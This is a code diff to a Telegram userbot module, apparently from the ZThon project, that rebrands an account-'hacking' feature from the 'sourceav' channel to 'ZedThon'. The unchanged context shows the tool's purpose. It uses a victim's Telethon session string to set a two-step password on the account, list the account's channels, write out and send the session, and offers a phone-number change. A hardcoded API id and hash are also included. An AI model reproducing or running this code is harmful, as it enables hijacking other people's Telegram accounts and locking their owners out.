@@ -78,7 +78,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('sourceav')
+      await X.edit_2fa('zedthon')
       return True
     except:
       return False
@@ -155,7 +155,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "sourceav"
+channel = "zedthon"
 menu = '''
 
 A  ➠   ** تحقق من قنوات ومجموعات الحساب **
@@ -186,7 +186,7 @@ M  ➠  ** تغييـر رقـم هـاتف الحسـاب **
 
 '''
 mm = '''
-**- عليك الانضمـام في قنـاة السـورس اولاً**  @sourceav
+**- عليك الانضمـام في قنـاة السـورس اولاً**  @ZedThon
 '''
 
 keyboard = [
@@ -211,7 +211,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/sourceav")
+    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZedThon")
     ]
 ]
 
@@ -219,14 +219,14 @@ keyboard = [
 
 @zedub.zed_cmd(pattern="هاك$")
 async def op(event):
-    Assist_So_Av_BOT = Bot_Username.replace("@","")       
-    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{Assist_So_Av_BOT} \n- وارسـال الامـر  /hack**")
+    zelzal = Bot_Username.replace("@","")       
+    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")
 
 
 @zedub.zed_cmd(pattern="اختراق$")
 async def op(event):
-    Assist_So_Av_BOT = Bot_Username.replace("@","")       
-    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{Assist_So_Av_BOT} \n- وارسـال الامـر  /hack**")
+    zelzal = Bot_Username.replace("@","")       
+    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")
 
  
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
@@ -256,7 +256,7 @@ async def start(event):
             Button.inline("N", data="NNN"),
             ],
           [
-            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/sourceav")
+            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZedThon")
             ]
         ]
         await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
@@ -278,7 +278,7 @@ async def users(event):
         return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\n**- بواسطـة افـاتـار @sourceav**")
+        file.write(i + "\n\n**- بواسطـة افـاتـار @ZedThon**")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
